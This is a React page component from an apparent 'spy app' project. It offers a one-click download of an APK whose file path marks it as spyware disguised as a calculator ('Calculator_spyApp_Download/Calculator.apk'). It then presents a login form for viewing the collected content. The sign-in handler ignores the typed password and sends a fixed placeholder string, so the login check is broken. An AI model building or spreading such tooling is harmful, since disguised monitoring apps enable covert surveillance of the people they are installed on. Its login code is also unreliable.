import React, { useState } from 'react';
import ApkFile from './Calculator_spyApp_Download/Calculator.apk'

function Home(props) {



  const [email, setemail] = useState("");
  const [password, setpassword] = useState("");

  function email2(e) {
    setemail(e.target.value)
  }

  function password2(e) {
    setpassword(e.target.value)
  }

  async function handle() {
    var data1 = await props.connecttoDb(email, 'someOtherValue');
    // console.log(data1)
    props.setthedata(data1)
    // console.log(props.fetchedData)
  }

  function downloadApp(url) {
    console.log("download")
    const flieName=url.split("/").pop();
    const aTag=document.createElement("a");
    aTag.href=url;
    aTag.setAttribute("download",flieName)
    document.body.appendChild(aTag);
      aTag.click();
      aTag.remove();
  }

  return (
    <div className="row_2">
      <div className="row py-5 px-5 Home">
        <div className="col-md-8 py-5">
          <h1>Do you want to Download the Spy app</h1>
          <h3>After download the app sign up carefully and come back to this site again and login and see the content</h3>
          <button className="btn-success btn-lg my-3" style={{ color: "white" }} onClick={() => { downloadApp(ApkFile) }}>Download the App</button>
        </div>
        <div className="col-md-4 py-5  "> <div class="input-group input-group-lg">
          <h1>Login</h1>
          <div class="input-group input-group-lg mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text" id="basic-addon1">@</span>
            </div>
            <input type="text" onChange={email2} class="form-control" value={email} placeholder="Email" aria-label="Username" aria-describedby="basic-addon1" />
          </div>
          <div class="input-group input-group-lg mb-3">
            <div class="input-group-prepend">
              <span class="input-group-text" id="basic-addon1">@</span>
            </div>
            <input type="text" class="form-control" onChange={password2} placeholder="Password" value={password} aria-label="Username" aria-describedby="basic-addon1" />
          </div>

          <button className="btn-success btn-lg my-3" style={{ color: "white" }} onClick={handle} >Sign in</button>
          {/* onClick={() => { props.connecttoDb(email, password) }} */}
        </div>
        </div>

      </div>

    </div>
  );
}

export default Home;
